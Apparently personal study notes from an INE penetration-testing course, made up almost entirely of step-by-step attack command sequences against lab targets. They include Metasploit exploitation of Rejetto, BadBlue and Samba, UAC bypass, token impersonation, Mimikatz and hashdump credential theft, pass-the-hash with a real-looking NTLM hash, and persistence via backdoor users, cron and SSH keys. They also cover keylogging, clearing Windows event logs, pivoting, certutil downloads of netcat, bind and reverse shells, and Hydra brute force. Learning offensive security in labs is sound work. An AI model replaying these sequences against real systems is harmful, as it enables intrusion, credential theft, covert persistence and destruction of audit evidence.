            meterpreter>shell
            ls
            /bin/bash -i             /linux session
            ps
            sessions 1
            ps    process
            migrate 580
            migrate -N apache2
            execute -f ifconfig
            ?           //help manu
            mkdir test
            rmdir test 
            
            ```
            
        - Upgrading Command Shells To Meterpreter Shells
            
            ```bash
            ifconfig       /eth1 2 to 3
            service postgresql start && msfconsole
            worksapce -a upgrading_shells
            setg RHOSTS ip
            db_nmap -sV ip
            search type: exploit samba
            use exploit/linux/samba/is_known_pipename
            show options
            run
            
            //shell 
            ls
            pwd
            /tmp
            /bin/bash -i
            victim# ctrl+z
            sessions
            search shell_to_meterperter
            us 1
            show options
            set SESSION 1
            set LHOST eth1
            run
            sessiions
            sessions 2
            
            sessions -h
            sessions -u 1
            sessions
            sessions 3
            meterpreter>
            sysinfo
            getuid
            
            ```
            
        - **Windows Post Exploitation**
            - Windows Post Exploitation Modules
                
                ```bash
                ifconfig
                service postgresql start && msfconsole
                workspace -a windows_post
                workspace
                setg RHOSTS 10.2.23.169
                db_nmap -sS -sV -O 10.2.23.169
                services
                search rejetto
                use exploit/windows/http/rejetto_hfs_exec
                show options
                run
                
                meterpreter>sysinfo
                getuid
                help
                screenshot      //got the ss in file #
                getsystem
                getuid
                hashdump              //fail
                show_mount
                ps            /process
                migrate 2212
                sysinfo
                dir
                cd C:\\
                dir
                cat flag.txt
                pwd
                download flag.txt
                exit
                background 
                sessions
                search upgrade
                search upgrade platform:windows
                search migrate
                use post/windows/manage/migrate
                show options
                 set SESSION 1
                 run sessions 
                 sessions 1
                 meterpreter>background
                 
                 //module for post exploitation
                 search win_privs
                 use post/windows/gather/win_privs
                 show options
                 set SESSION 1
                 run
                 
                 //another post exploitation module
                 
                 search enum_logged_on
                 use post/windows/gather/enum_logged_on_users
                 show options
                 set SESSION 1
                 run
                
                search checkvm
                use post/windows/gather/chekvm
                show options
                set SESSION 1
                run
                
                search enum_applications
                use post/windows/gather/enum_applications
                show options
                set SESSION 1
                run
                
                loot          //access info form this command
                
                //what anivirus solutions
                
                seach type:post platform:windows enum_av
                use post/windows/gather/enum_av_excluded
                show options
                set SESSION 1
                run
                
                search enum_computer
                use 0
                show options
                set SESSION 1
                run
                
                //install paches
                search enum_pathces
                use 0
                show options
                set SESSION 1
                run
                sessions
                sessions 1
                meterpreter>ps
                migrate 896
                background
                run
                
                sessions 1
                shell
                systeminfo
                exit
                background
                search enum_shares
                use post/windows/gather/enum_shares
                show options
                set SESSION 1
                run
                
                //ability to rdp enable
                search rdp platform: windows
                use post/windows/manage/enable_rdp
                show options
                set SESSION 1
                run
                
                ```
                
            - Windows Privilege Escalation : Bypassing UAC
                
                UAC : user access control: windows security feature
                
                ```bash
                
                service postgresql start && msfconsole
                workspace -a UACBypass
                workspace
                setg RHOSTS 192.18.76.3
                db_nmap -sS -sV -O 192.18.76.3
                services
                vuls
                search rejetto
                use 0
                set payload windows/x64/meterpreter/reverse_tcp
                show options
                run
                meterpreter>sysinfo
                getuid
                getsystem
                getprivs
                shell
                net users
                net localgroup administrators
                exit
                background
                sessions
                search bypassuac
                use exploit/windows/local/bypassuac_injection
                show options
                set SESSION 1
                sessions 
                show options
                set LPORT 4433
                run
                
                set TARGET
                set TARGET Windows\ x64
                run
                
                meterpreter>sysinfo
                getuid
                
                getsystem
                getuid         NT Authority\system  
                //got highest level authority
                
                //now elevate our privilege
                
                hashdump
                
                ```
                
            - Windows Privilege Escalation: Token Impersonation with Incognito
                
                LSASS: local security authority subsystem service
                
                Incognito module originally a **standalone** application
                
                ```bash
                given target ip
                service postgresql start && msfconsole
                workspace -a Impersonate
                workspace
                setg RHOSTS 192.18.76.3
                db_nmap -sS -sV -O 192.18.76.3
                services
                vuls
                search rejetto      //version: HttpFileServer httpd 2.3
                use exploit/windows/http/rejetto_hfs_exec
                show options
                set payload windows/x64/meterpreter/reverse_tcp
                exploit
                meterpreter>sysinfo
                getuid
                output: NT authority\local service  where loal service means associate with local
                getprivs
                hasdump
                cd C:\\
                sc Users
                cd Administrator
                load incognito
                list_tokens -u
                impersonate_token "ATTACKDEFENSE\Administrator"
                getuid
                //successfully ATTACKDEFENSE\Administrator
                 hashdump     //access denied
                  ps
                  migrate 3544       //explorer.exe
                  hasdump
                  cd C:\\
                  cd Users
                  cd Administrator
                   get privs     
                
                ```
                
            - Dumping Hashes with Mimikatz
                
                ```bash
                
                given target ip
                service postgresql start && msfconsole
                workspace -a Mimikatz
                workspace
                setg RHOSTS 192.18.76.3
                db_nmap -sS -sV -O 192.18.76.3
                services
                vuls
                search badblue 2.7    //pattasu
                use exploit/windows/http/badblue_passthru
                show options
                set target
                set target Badblue\ EE\ 2.7\ Universal
                exploit
                
                meterpreter>sysinfo
                ps
                getuid
                grep lsass
                migrate 792
                sysinfo
                
                - **Hashdump - Kiwi**
                load kiwi
                creds_all
                lsa_dump_sam
                lsa_dump_secrets
                -**Hashdump Mimikatz**
                
                shell
                cd C:\\
                mkdir Temp
                cd Temp
                meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
                shell
                .\mimikatz.exe - run mimikatz
                privilege::debu
                lsadump::sam
                lsadump::secrets
                sekurlsa::logonPasswords
                
                lsadump:sam
                
                ```
                
            - Pass the Hash with PSExec
                
                ```bash
                nmap -sV -p 80 10.2.23.202`
                - Exploit **badblue** pattasu
                - Got meterpreter session
                pgrep lsass
                migrate 772
                getuid
                load kiwi
                lsa_dump_sam
                - Copy and save the Administartor and students NTLM hashes
                hashdump
                - LM+NTLM hash is necessary, so copy the string:
                background
                search psexec
                use exploit/windows/smb/psexec
                options
                set payload windows/x64/meterprter/revese_tcp
                set LPORT 4433
                set RHOSTS 10.2.23.202
                set SMBUser Administrator
                set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
                exploit
                meterpreter>
                getuid, sysinfo
                
                background 
                set SMBUser studen
                set SMBPass  //hash of student
                exploit       //fail
                
                crackmapexec smb 10.2.23.202 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami”
                
                ```
                
            - Establishing Persistence on Windows
                
                ```bash
                given target ip
                service postgresql start && msfconsole
                workspace -a Persistence
                workspace
                setg RHOSTS ip
                db_nmap -sS -sV -O ip
                services
                vuls
                search **rejetto**
                use 0
                set payload windows/x64/meterpreter/reverse_tcp
                show options
                exploit
                
                meterpreter>sysinfo
                getuid
                background
                search platform:windows persistence
                use exploit/windows/local/persistence_service
                set payload windows/x64/meterpreter/reverse_tcp
                show options
                set SESSION 1
                exploit
                set payload windows/meterpreter/reverse_tcp
                exploit
                meterpreter>getuid
                exit
                sessions
                sessions -K      //kill sessions all
                use multi/handler
                set payload windows/meterpreter/revese_tcp
                show options
                set LHOST eth1
                run
                
                meterpreter>exit
                run
                meterpreter>
                exit
                msfconsole
                
                use multi/handler
                set payload windows/meterpreter/reveres_tcp
                set LHOST eth1
                run
                meterpreter> 
                ```
                
            - Enabling RDP
                
                ```bash
                given target ip
                service postgresql start && msfconsole
                workspace -a RDP
                workspace
                setg RHOSTS ip
                db_nmap -sS -sV -O ip
                services
                vuls
                
                search **badblue** 2.7    //pattasu
                use exploit/windows/http/badblue_passthru
                show options
                set target
                set target Badblue\ EE\ 2.7\ Universal
                exploit
                
                meterpreter>sysinfo
                search enable_rdp
                use post/windows/manage/enable_rdp
                show options
                set SESSION 1
                expoit
                db_namp -sV -p 3389 ip
                sessions 1
                shell
                net users
                net user administrator hacker_123321
                exit
                meterpreter>
                
                //new command window
                $
                xfreerdp /u:administrator /p:qwertyuiop /v:10.4.18.131:3333
                
                ```
                
            - Windows Keylogging
                
                ```bash
                
                given target ip
                service postgresql start && msfconsole
                workspace -a keylogging
                workspace
                setg RHOSTS ip
                db_nmap -sS -sV -O ip
                services
                vuls
                search **badblue** 2.7    //pattasu
                use exploit/windows/http/badblue_passthru
                show options
                set target
                set target Badblue\ EE\ 2.7\ Universal
                exploit
                meterpreter>sysinfo
                getuid
                pgrep explorer
                migrate 2312
                help
                keyscan_start
                
                //typing in notepad
                admin: momo pass: koko
                this is something
                ipconfig
                keyscan_dump
                keyscan_stop
                keyscan_dump
                
                ```
                
            - Clearing Windows Event Logs
                
                are:
                
                application, system, security logs
                
                ```bash
                given target ip
                service postgresql start && msfconsole
                workspace -a Clearev
                workspace
                setg RHOSTS ip
                db_nmap -sS -sV -O ip
                services
                vuls
                
                search **badblue** 2.7    //pattasu
                use exploit/windows/http/badblue_passthru
                show options
                set target
                set target Badblue\ EE\ 2.7\ Universal
                exploit
                meterpreter>sysinfo
                
                getuid
                //open windows logs in windows os
                shell
                net user administrator Password_123321
                 c:>exit
                 meterpreter>clearev
                 rm with file
                 
                
                ```
                
            - **Pivoting**
                - Pic: Pivoting Visualization
                    
                    ![image.png](image%205.png)
                    
                
                ```bash
                fist ping 2 ip and check
                victim_1 : ip
                victim_2 : ip(cannot communicate with kali)
                
                service postgresql start && msfconsole
                workspace -a Pivoting
                db_nmap -sV -p- -O <Victim1IP>
                services
                search rejetto
                use exploit/windows/http/rejetto_hfs_exe
                show options
                set rhosts <Victim1IP>
                run
                Got Meterpreter session
                sysinfo
                getuid
                ipconfig
                run autoroute -s <Victim2IP/24>
                //run this in background
                background
                rename the session 1 meterpreter
                sessions -n victim1 -i 1
                sessions
                -Now portscan
                search portscan
                use auxiliary/scanner/portscan/tcp
                show options
                set rhosts Victim2iP
                //set PORTS 1-100
                exploit
                //Port 80 open port found on victim2
                -Now go to session in metereter
                sessions 1
                portfwd add -l 1234 -p 80 -r <Victim2IP>
                - Now again put this session in background
                background
                db_nmap -sV -sS -p 1234 localhost
                search badblue
                use exploit/windows/http/badblue_passthru
                show options
                set payload windows/meterpreter/**bind_tcp**
                set rhosts <Victim2IP>
                set LPORT 4433
                run
                got meterpreter session
                sessions
                //here is 2 session
                sessions -n victim-2 -i 2
                sessions
                sessions 2
                meterpreter>sysinfo
                Observe that this is 2016 and old is 2012
                get flag
                ```
                
        - **Linux Post Exploitation**
            - Linux Post Exploitation Modules
                
                ```bash
                ifconfig
                service postgresql start && msfconsole
                workspace -a Lunux_PE
                setg RHOSTS ip
                db_nmap -sV -p- -O <Victim1IP>
                services
                search type:exploit samba
                use exploit/linux/samba/is_known_pipename
                show options
                exploit
                pwd
                /tmp
                exit
                sessions
                sessions -u 1
                sessions
                sessions 2
                meterpreter>sysinfo
                geuid
                shell
                
                /bin/bash -i
                >whoami
                cat /etc/passwd
                groups root
                cat /etc/*issue
                uname -r
                uname -a
                ip a s
                netstat -antp
                ps aux
                env
                exit
                
                sessions
                sessions -u 1
                sessions
                searchenum_configs
                search enum_configs
                use post/linux/gather/enu_configs
                show options
                set SESSION 3
                run
                
                loot           //path 
                cat loot_path
                
                ...
                
                use post/multi/gather/env
                showo optins
                set SESSION 3
                run
                search enum_network
                use post/linux/gather/enum_network
                show options
                set SESSION 3
                run
                
                loot
                cat path
                cat path......txt
                search enum_portections
                use post/linux/gather/enum_protection
                show options
                set SESSION 3
                run 
                
                notes
                
                //system enum
                
                search enum_system
                use post/linux/gather/enum_system
                set SESSION 3
                run
                
                loot      /install packages
                
                search checkcontaieer
                use post/linux/gather /checkcontainer
                set SESSION 3
                run 
                
                seach  scheckum
                use plot/linux/gather/checkvm
                set SESSION 3
                run
                
                search enum-users_history
                use post/linux.gather/enum_users_history
                set SESSION 3
                run
                
                loot
                cat /root.. 47.txt
                
                ```
                
            - Linux Privilege Escalation: Exploiting A vulnerable Program
                
                ```bash
                ifconfig
                service postgresql start && msfconsole
                workspace -a LinuxPrivEsc
                setg RHOSTS ip
                db_nmap -sV -p- -O ip
                services
                search ssh_login
                use auxiliary/scanner/ssh/ssh_login
                show options
                set USERNAME jackie
                set PASSWORD password
                exploit
                
                sessions
                sessions 1
                pwd
                /bin/bash -i
                >cat /etc/*issue
                uname -r 
                exit
                
                sessions -u 1
                sessions
                sessions 2
                meterpreter>sysinfo
                getuid
                shell
                /bin/bash -i
                >cat /etc/passwd
                ps aux
                cat /bin/check_down
                chkrootkit --hlep
                chkrootkit -V
                background
                
                search chkrootkit
                use exploit/unix/local/chkrootkit
                show options
                set CHKROOTKIT /bin/chkrootkit
                set SESSION 2
                ifconfig
                set LHOSTS ip
                sessions
                exploit
                show options
                set LHOST eth0
                exploit
                
                /bin/bash -i
                whoami
                
                ```
                
            - Dumping Hashes with Hashdump
                
                ```bash
                ifconfig
                service postgresql start && msfconsole
                workspace -a hashdump
                setg RHOSTS ip--3
                db_nmap -sV  ip
                services
                search samba type:expoit
                use exploit/liux/samba/is_known_pipename
                show options
                exploit
                
                //found shell
                pwd
                /bin/bash -i
                
                exit
                sessions
                sessions -u 1
                sessions 2
                meterepreter>hashdump
                getuid
                background
                sessios
                sessions -u 1
                sessions
                search hashdump
                use post/linux/gather/hashdump
                show options
                set SESSION 3
                run
                loot
                cat ...57.txt
                cat ....78.txt
                sesssions 3
                meterpreter>shell
                /bin/bash -i
                
                passwd root
                password123
                passwd alexis
                password321
                //terminate
                sessions -u 1
                show options
                set SESSION 4
                run
                loot
                cat ...path_..txt
                sessions 4
                meterpreter>
                
                ```
                
            - Establishing Persistence On Linux
                
                ```bash
                
                ifconfig
                service postgresql start && msfconsole
                workspace -a linux_persistance
                setg RHOSTS ip
                db_nmap -sV -p- -O ip
                services
                search ssh_login
                use auxiliary/scanner/ssh/ssh_login
                show options
                set USERNAME jackie
                set PASSWORD password
                expoit
                
                sessions
                sessions -u 1
                sessions
                search chkrootkit
                use exploit/unix/local/chkrootkit
                show options
                set SESSION 2
                set CHKROOTKIT /bin/chkrootkit
                exploit
                
                set LHOST eth0
                sessions
                expoit
                //shell
                ls
                flag
                cat flag
                exit
                sessions
                sessions -i 3
                sessions
                sessions 4
                getuid
                shell
                /bin/bash -i
                whoami
                //terminate
                meterpreter>shell
                /bin/bash -i
                cat /etc/passwd
                
                useradd -m ftp -s /bin/bash       //s means shell
                passwd ftp
                password123
                
                cat /etc/passwd
                groups root
                usermod -aG root ftp
                groups ftp
                
                //modify backdoor user id
                
                usermod -u 15 ftp
                cat /etc/passwd
                //terminate
                
                meterpreter> background
                search plaotform:linux persistence
                use exploit/linux/local/apt_package_manager_persistnece
                show options
                info
                
                use exploit/linux/cron_persistence
                set SESSION 4
                exploit
                
                terminate
                show options
                set LPORT 4422
                ifconfgi
                set LHOST eth1
                exploit
                
                search platform:linux persistence
                use exploit/linux/local/service_persistence
                show options
                set SESSION 4
                exploit
                set payload cmd/unix/reverse_python
                show options
                set LOST ip
                set LPORT 4422
                exploit           /failed here
                info
                set target 3
                exploit
                
                set terget 4
                //failded
                
                serach platform :linux persistence
                use post/linux/manage/sshkey_persistence
                show optons
                set CREATESSHFOLDER true
                set SESSION 4
                info 
                exploit
                
                //private key
                loot
                cat ....312.txt
                exit -yes
                
                //new command #
                vim ssh_key
                //past private key here : RSA private key
                
                chmod 0400 ssh_key
                ssh -i ssh_key root@eth1--->3
                
                //got the shell
                
                ls
                falg
                cat flag
                exit
                ssh -i ssh_key ftp@ip
                //got ftp shell
                
                ```
                
        - **Armitage**
            - Port Scanning and Enumeration with Armitage
            - Exploiting and Post Exploiting with Armitage
    
- **Exploitation**
    
    **Labs:**
    
    - **Banner Grabbing**
        
        In this task you will learn how to perform banner grabbing with a plethora of tools in order to obtain service version information from specific services running on a target system.
        
        **Identify the target IP address?**
        
        Before we can begin exploring banner grabbing, you will need to obtain the IP address of the target system within the lab environment. This is because the IP addresses and the corresponding subnets change whenever you launch a lab.
        
        To identify the target IP address, you will need to run the following command on the Kali Linux system provided to you:: ifconfig : eth1 192.8.94.2 : target ip is: 192.8.94.3
        
        ```bash
        ifconfig
        #eth1 ip.2 target_ip.3
        nmap -sV demo.ine.local
        nmap -Pn -A -T4 demo.ine.local
        #22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
        nmap -sV --script=bannner demo.ine.local
        
        nc demo.ine.local 22
        #banner grabbing with netcat
        
        ```
        
        In this lab, we have taken a look at how to perform banner grabbing with an Nmap script and Netcat. Why is this important? Well, when identifying exploits for services running on a target, one key piece of information that you will require is the exact service version. While Nmap obtains this information with ease, in certain cases Nmap may not be able to identify the service or service version running on an open port, and as a result, you will need to have the ability to perform banner grabbing manually to get the information you are looking for.
        
    - **Vulnerability Scanning with Nmap Scripts**
        
        ## Goal
        
        In this lab you will learn how to perform vulnerability scanning by leveraging the Nmap scripting engine.
        
        ```bash
        
         Identify the target IP address
         ifconfig
         #eth1 next ip
        
        cat /etc/hosts
        nmap -sV -O demo.ine.local
        #80/tcp open  http    Apache httpd 2.4.6 ((Unix))
        
        http://demo.ine.local
        #the source code of the webpage contains a JavaScript block that is executing a CGI script called gettime.cgi.
        #This is looks very interesting as the target may be vulnerable to the ShellShock exploit as the site is executing a CGI script that is responsible for displaying the countdown timer.
        #While we are able to identify a CGI script running on a the web server, we still need to conclusively identify whether the web server is vulnerable to the ShellShock exploit.
        #Luckily for us, Nmap provides us with an Nmap script to do just this. We can run the http-shellshock.nse script on the target by running the following command:
        
        nmap -sV -p 80 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.152.25.3
        #Nmap script scan reveals that the web server running on the target is vulnerable to the ShellShock exploit.
        
        ls -al /usr/share/nmap/scripts | grep vuln
        #this give you a list of nmap scripts that can be used to identify specific vul on a target machine
        
        ```
        
        In this lab, we have taken a look at how utilize Nmap to perform vulnerability scans on specific services running on a target. This can be very useful and time efficient when trying to identify whether a target is vulnerable to a specific exploit or vulnerability.
        
    - **Fixing Exploits**
        
        In this lab, you will learn how to find publicly available exploits with Searchsploit and fix/modify exploits to get them to work as intended. When using publicly available exploit code, you may run across issues with the exploit script and as a result, you must be able to modify the exploit code to get it to work correctly based on your requirements.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Your task is to find publicly available exploits with Searchsploit and learn how to fix/modify exploits to get them to work as intended.
        
        **Tools: nmap, msf, searchsploit, python**
        
        ```bash
        nmap -sV demo.ine.local
        #Rejetto HTTP File Server running on port 80, more specifically, version 2.3, is present.
        searchsploit HTTP File Server 2.3
        #Searchsploit reveals quite a few exploits, one of which is a Metasploit module, however, in our case, we will be using the Python exploit.
        searchsploit -m 39161
        vim 39161.py
        #edit ip to eth1 and port 1234
        ifconfig
        
        #For this exploit to work, you will need to host the nc.exe on a web server as the exploit will download it to the target system.
        cp /usr/share/windows-resources/binaries/nc.exe /root/Desktop/
        
        #After copying the nc.exe executable to the Desktop, we can host it by setting up an HTTP server on port 80 with Python. This can be done by running the following command:
        python -m SimpleHTTPServer 80
        
        #new terminal
        #set up the Netcat listener to receive the connection from the target once the exploit script is executed.
        nc -nvlp 1234
        
        #open another terminal window to run the exploit script.
        python 39161.py demo.ine.local 80
        
        ```
        
    - **Netcat Fundamentals**
        
        Netcat, often referred to as the "Swiss Army knife" of networking, is a versatile tool that allows users to interact with network connections. It can be used for a wide range of tasks, including port scanning, transferring files, and setting up network listeners or reverse shells. Its simplicity and flexibility make it an essential tool for network administrators and penetration testers.
        
        In this lab you will learn the fundamentals of Netcat and how to use Netcat to setup a listener, transfer messages and transfer files between two systems.
        
        In this lab environment, you will be provided with GUI access to a Kali machine and a target Windows machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Explore the use of Netcat to set up a listener, transfer messages, and transfer files between two systems.
        
        Tools: netcat
        
        ```bash
        ping -c 4 demo.ine.local
        nc -help
        nc demo.ine.local_ip 80
        nc -nv 10.10.44.4 80
        #this is open 
        nc -nv 10.10.44.4 21
        #As shown in the following screenshot, Netcat tells us that the connection is refused. This does not necessarily mean that the port is closed, it could also mean that access to the port is being blocked or filtered by a firewall.
        nc -nvu 10.10.44.4 161
        #As shown in the following command, if we try and connect to UDP port 161, Netcat tells us that the port is open.
        
        cd /usr/share/windows-binaries
        #The first step will involve navigating to the /usr/share/windows-binaries directory. 
        
        python -m SimpleHTTPServer 80
        #We can then setup an HTTP server with Python within this directory by running the following command:
        
        #another command and ifconfig eth1
        
        #windows target machine and to powershell and got cd Desktop
        certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe
        
        #kali and set nc listener
        nc -nvlp 1234
        
        #windows
        ...Desktop>nc -nv 10.10.44.4 1234
        #if not working 
        Desktop>.\nc
        10.10.44.4 1234
        
        who ami i # its ok now
        
        #anoterh
        echo "Hello, this was sent over with Netcat" >> test.txt
        nc.exe -nvlp 1234 > test.txt
        
        ```
        
    - **Blind Shells**
        
        In this lab you will learn how to setup a bind shell with Netcat.
        
        A bind shell is a type of remote shell where the attacker connects to a listener on the target system. In order for this to work a listener needs to be running on the target system so that the attacker can connect to it and consequently obtain a remote shell.
        
        This type of shell is not preferred as the attacker directly connects to the target system and in most cases, ingress traffic is always blocked or flagged as suspicious. Nonetheless, it is very important to learn how bind shells work and how they can be setup with Netcat.
        
        In this lab environment, you will be provided with GUI access to a Kali machine and a target Windows machine.
        
        **Objective:** Your task is to setup a bind shell with Netcat.
        
        **Tools: Netcat , python**
        
        ```bash
        
        //why revere shell over bind shell?
        //given target ip eternal blue
        //kali
        cd /usr/share/windows-binaries
        ls -al
        python -m SimpleHTTPServer 80
        
        #another ifconfg eth1 search in website and downloads
        //windows
        cmd administrator
        cd Downloads
        dir
        certutil -urlcache -f http://eth1/nc.exe nc.exe
        nc.exe -nvlp 1234 -e cmd.exe
        
        //kali
        nc -nv ip_windows 1234
        whoami
        dir
        exit
        
        //windows attacker
        
        //kali
        nc -nvlp 1234 -c /bin/bash
        //windows
        nc.exe -nv ip 1234
        ls
        /bin/bash -i
        id
        
        ```
        
    - **Reverse Shells**
        
        In this lab you will learn how to setup a reverse shell with Netcat.
        
        A reverse shell is a type of remote shell where the target system connects to a listener on the attacker's system. In order for this to work the target system needs to connect to a listener on the attacker's system.
        
        This type of shell is the preferred remote shell used by attackers as the target makes an outgoing connection to the attacker's system.
        
        In this lab environment, you will be provided with GUI access to a Kali machine and a target Windows machine.
        
        **Objective:** Your task is to setup a reverse shell with Netcat.
        
        Tools: netcat , python
        
        ```bash
        
        cd /usr/share/windows-binaries
        ls
        python -m SimpleHTTPServer 80
        ifconfig
        #10.10.44.4
        
        #windows administrator
        certutil -urlcache -f http://<Kali_Machine_IP_address>/nc.exe nc.exe
        dir
        
        #kali
        nc -nvlp 1234
        
        #windows
        ./nc.exe -nv <Kali_Machine_IP_address> 1234 -e cmd.exe
        
        #kali
        whoami
        pwd 
        
        ```
        
    - **The Metasploit Framework (MSF)**
        
        This lab's objective is to introduce you to the Metasploit Framework and showcase how it can be used to exploit a vulnerable service running on a target system.
        
        The Metasploit Framework is a popular open-source exploitation framework that can automate nearly all phases of a penetration test, from information gathering to exploitation.
        
        While knowing how to manually exploit a vulnerable service is important, automated exploitation frameworks like Metasploit automate the tedious aspects of exploitation and can be very time-efficient. As a result, it is vitally important to know how to use the Metasploit Framework to facilitate the exploitation of vulnerable services as efficiently as possible.
        
        In this lab environment, you will have GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Your task is to exploit a vulnerable service running on a target system using Metasploit.
        
        **Tools: nmap, msf**
        
        ```bash
        
        ping -c4 demo.ine.local
        nmap -sS -sV demo.ine.local
        #One service, in particular, looks interesting, the Apache web server running on port 80.
        
        #in browser : http://demo.ine.local'
        # accessing the web server via a browser reveals that a web application called ProcessMaker is running and requires username/password authentication.
        #Prosessmaker user: admin password:admin default credential for (google search : processmaker default credentials)
        
        searchsploit ProcessMaker
        msfconsole
        search ProcessMaker
        use exploit/multi/http/processmaker_exec
        show options
        set RHOSTS demo.ine.local
        run
        #got meterpreter session
        
        ```
        
        In this lab, we explored the process of performing a port scan, identifying a vulnerable web app, searching for an exploit and exploiting the web application with the Metasploit Framework (MSF) in order to obtain remote access to the target system.
        
    - **CTF 1**
        
        This lab emphasizes identifying and exploiting vulnerabilities across two target Linux machines. You'll analyze web applications and services running on these machines to uncover weaknesses and exploit them to retrieve critical flags. The tasks involve leveraging known credentials, insecure configurations, and vulnerable plugins to compromise systems and access sensitive data.
        
        Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.
        
        Two Linux machines are accessible at **target1.ine.local** and **target2.ine.local**. Identify the application and service running on these machines, and capture the flags. The flag is an md5 hash format.
        
        - **Flag 1:** Identify and exploit the vulnerable web application running on **target1.ine.local** and retrieve the flag from the root directory. The credentials **admin:password1** may be useful.
        - **Flag 2:** Further, identify and compromise an insecure system user on **target1.ine.local**.
        - **Flag 3:** Identify and exploit the vulnerable plugin used by the web application running on **target2.ine.local** and retrieve the **flag3.txt** file from the root directory.
        - **Flag 4:** Further, identify and compromise a system user requiring no authentication on **target2.ine.local**.
        
        The following wordlists will be useful:
        
        - /usr/share/nmap/nselib/data/wp-plugins.lst
        - /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
        
        **Tools: nmap, hydra ,dirb , python3, metasploit**
        
        - **Nikto**: Quick vulnerability assessment of a web server.
        - **Gobuster**: Discover hidden directories, files, or subdomains.
        
        ```bash
        **//Flag1**
        
        namp -sC -sV target1.ine.local
        #Nmap scan results, we can see that port 80 is open, indicating that a web server is running on this port.
        #Flatcore and has a login form. The question provides us with the credentials admin:password1.
        http://target1.ine.local/**acp/**
        #After logging in, you will see a dashboard or an admin panel that looks something like this:
        searchsploit flatcore
        #there are two available exploits, but neither is present in Metasploit. This means we need to execute the exploit manually on our system. Since our goal is to gain access to the root system, we will use the first exploit, which is Remote Code Execution (Authenticated).
        searchsploit -m 50262
        #50262 is the exploit ID we are copying from the Exploit-DB database. Once copied, we can analyze and modify it if necessary before executing it
        #Before executing the exploit, we should first read and analyze the code to understand how it works. We can use various tools for this, such as: cat, vim, or mousepad, etc.Before executing the exploit, we should first read and analyze the code to understand how it works. We can use various tools for this, such as: cat, vim, or mousepad, etc.
        #After reviewing the code, we can determine how to execute the exploit. To run the Python script and attempt exploitation, we use the following command
        python3 50262.py http://target1.ine.local/ admin password1
        
        #successufully  logged 
        ls /
        cat /flag1.txt
        
        **//Flag2**
        
        ls -l /home
        #user: iamaweakuser : this user likely has weak pass
        hydra -l iamaweakuser -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://target1.ine.local
        #got pass: angel
        ssh iamaweakuser@target1.ine.local
        pass: angel
        #got shell
        ls
        cat flag2.txt
        
        **//Flag3**
        
        nmap -Pn -A -T4 target2.ine.local
        #port 80 is open navigate this website: website is running on WordPress
        #for wordpress run wpscan but not helpful info
        #dig deeper with nikto
        
        nikto -h target2.ine.local
        #discoverd plugin named Akismet but after enum not vulnerable
        
        gobuster dir -u http://target2.ine.local/**wp-content**/plugins/ -w /usr/share/nmap/nselib/data/wp-plugins.lst
        
        #attempted to bruteforce the plugin dir
        #another plugin name Duplicator
        
        msfconsole
        serach duplicator
        use auxiliary/scanner/http/wp_duplicator_file_read
        set rhosts target2.ine.local
        run
        #got the default /etc/passwd dir output
        #change file_path
        **set FILEPATH /flag3.txt**
        
        #got the flag3
        
        **//Flag4**
        #while running /etc/passwd discover name: iamacrazyfreeuser who has direct access to bash
        ssh iamacrazyfreeuser@target2.ine.local
        
        #got access without any password
        ls
        cat flag4.txt
        
        ```
        
    
    - **Port Scanning & Enumeration -Windows**
        
        This lab offers a detailed exploration into port scanning and service enumeration on a Windows target using tools available on a Kali Linux system. Participants will use Nmap to conduct thorough scans, identify open ports, and analyze the services running on these ports, including web servers and other critical services.
        
        In this lab, we are given access to a Kali machine that provides you with a structured guide on how to perform port scanning and enumeration on a Windows target. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To identify the open ports on the system and identify any potentially interesting services that can be exploited to gain access to the system.
        
        **Tools: terminal, nmap, msf, firefox**
        
        ```bash
        
        ping -c 4 demo.ine.local
        nmap -sV demo.ine.local
        nmap -T4 -PA -sC -sV -p 1-10000 demo.ine.local
        #port 80 is open adn running Microsoft IIS 7.5
         https://demo.ine.local:4848
        #web server is running GlassFish.
        
         http://demo.ine.local:8484
        # Jenkins server is running on this web server.
        
        http://demo.ine.local:8585
        #this WAMP server hosts a few interesting web apps like WordPress and phpMyAdmin.
        
        #smb ort 445 enum
        nmap -sV -sC -p 445 demo.ine.local
        #Windows Server 2008 R2. , NetBios and computer hostname
        
        msfconsole
        use /auxiliary/scanner/smb/smb_version
        set RHOSTS demo.ine.local
        run
        #target system is running Windows Server 2008 R2.
        
        ##freely searching and got meterpreter session in 
        #exploit(multi/http/glassfish_deployer
        #exploit(windows/smb/ms17_010_eternalblue)
        #mysql -h demo.ine.local -u root -p
        #without password
        
        ```
        
    - **Targeting Microsoft IIS FTP**
        
        Microsoft FTP is a server feature that supports the transfer of files between machines using the File Transfer Protocol (FTP), commonly integrated with IIS to manage files over the web.
        
        This lab demonstrates how to exploit vulnerabilities in a Windows system running Microsoft FTP Service, including identifying weak configurations, testing for anonymous access, and conducting brute force attacks to gain unauthorized access and manipulate web server contents
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To outline the various techniques that can be used to exploit a Windows system running a Microsoft FTP server.
        
        **Tools: terminal, nmap , ftp , hydra**
        
        ```bash
        nmap -sV -sC -p21,80 demo.ine.local
        ftp demo.ine.local 21
        #failed login without user and pass
        
        hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local -t 4 ftp
        
        #got the credentials
